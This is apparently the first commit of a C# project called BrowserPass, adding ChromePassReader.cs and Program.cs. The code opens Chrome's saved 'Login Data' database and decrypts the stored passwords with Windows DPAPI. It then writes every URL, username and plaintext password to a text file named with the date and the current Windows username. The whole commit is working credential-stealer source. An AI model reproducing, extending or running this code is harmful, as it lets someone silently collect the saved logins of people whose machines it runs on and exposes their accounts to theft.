22d8100f1283005cb76fd822707d3c6c14f794ea
mirza <46076246+mirzapolat@users.noreply.github.com>
2022-06-09 16:45:32 +0200

    First Commit

---
+++ BrowserPass/ChromePassReader.cs
@@ -0,0 +1,82 @@
+﻿using System;
+using System.Data.SQLite;
+using System.Text;
+using System.IO;
+using System.Security.Cryptography;
+using System.Collections.Generic;
+using System.Data;
+
+namespace BrowserPass
+{
+    class ChromePassReader : IPassReader
+    {
+        public string BrowserName { get { return "Chrome"; } }
+
+        private const string LOGIN_DATA_PATH = "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
+
+        
+        public IEnumerable<CredentialModel> ReadPasswords()
+        {
+            var result = new List<CredentialModel>();
+
+            var appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData); // APPDATA
+            var p = Path.GetFullPath(appdata + LOGIN_DATA_PATH);
+
+            if (File.Exists(p))
+            {
+                using (var conn = new SQLiteConnection($"Data Source={p};"))
+                {
+                    conn.Open();
+                    using (SQLiteCommand cmd = new SQLiteCommand(conn))
+                    {
+                        cmd.CommandText = "SELECT action_url, username_value, password_value FROM logins";
+                        // Fehler
+                        using (SQLiteDataReader reader = cmd.ExecuteReader())
+                        {
+                            if (reader.HasRows)
+                            {
+                                while (reader.Read())
+                                {
+                                    var pass = Encoding.UTF8.GetString(ProtectedData.Unprotect(GetBytes(reader, 2), null, DataProtectionScope.CurrentUser));
+                                    result.Add(new CredentialModel()
+                                    {
+                                        Url = reader.GetString(0),
+                                        Username = reader.GetString(1),
+                                        Password = pass
+                                    });
+                                }
+                            }
+                        }
+                    }
+                    conn.Close();
+                }
+
+            }
+            else
+            {
+                throw new FileNotFoundException("Cannot find chrome logins file");
+            }
+            return result;
+        }
+
+        private byte[] GetBytes(SQLiteDataReader reader, int columnIndex)
+        {
+            const int CHUNK_SIZE = 2 * 1024;
+            byte[] buffer = new byte[CHUNK_SIZE];
+            long bytesRead;
+            long fieldOffset = 0;
+            using (MemoryStream stream = new MemoryStream())
+            {
+                while ((bytesRead = reader.GetBytes(columnIndex, fieldOffset, buffer, 0, buffer.Length)) > 0)
+                {
+                    stream.Write(buffer, 0, (int)bytesRead);
+                    fieldOffset += bytesRead;
+                }
+                return stream.ToArray();
+            }
+        }        
+    }
+
+
+
+}
---
+++ BrowserPass/Program.cs
@@ -0,0 +1,54 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+
+namespace BrowserPass
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            List<IPassReader> readers = new List<IPassReader>();
+            readers.Add(new ChromePassReader());
+            readers.Add(new FirefoxPassReader());
+            //readers.Add(new IE10PassReader());
+
+            string day = DateTime.Now.Day.ToString();
+            if (day.Length == 1) day = "0" + day;
+            string month = DateTime.Now.Month.ToString();
+            if (month.Length == 1) month = "0" + month;
+            string year = DateTime.Now.Year.ToString();
+
+            if (!File.Exists("SAVELOCATION.txt"))
+            {
+                File.WriteAllText("SAVELOCATION.txt", ".\\Passwords");
+            }
+
+            string location = File.ReadAllText("SAVELOCATION.txt");
+            if (!Directory.Exists(location)) Directory.CreateDirectory(location);
+
+            StreamWriter sw = new StreamWriter(String.Format(@"{4}\{0}-{1}-{2} {3}.txt", year, month, day, Environment.UserName, location));
+
+            foreach (var reader in readers)
+            {
+                sw.WriteLine($"------------------------");
+                sw.WriteLine($"DATA SOURCE = {reader.BrowserName}");
+                sw.WriteLine($"------------------------");
+                sw.WriteLine("");
+                try
+                {
+                    IEnumerable<CredentialModel> data = reader.ReadPasswords();
+                    foreach (var d in data)
+                        sw.WriteLine($"{d.Url}\n{d.Username}\n{d.Password}\n");
+                }
+                catch (Exception ex)
+                {
+                    sw.WriteLine($"Error reading {reader.BrowserName} passwords: \n" + ex.Message);
+                    sw.WriteLine("");
+                }
+            }
+
+            sw.Close();
+        }
+    }
+}
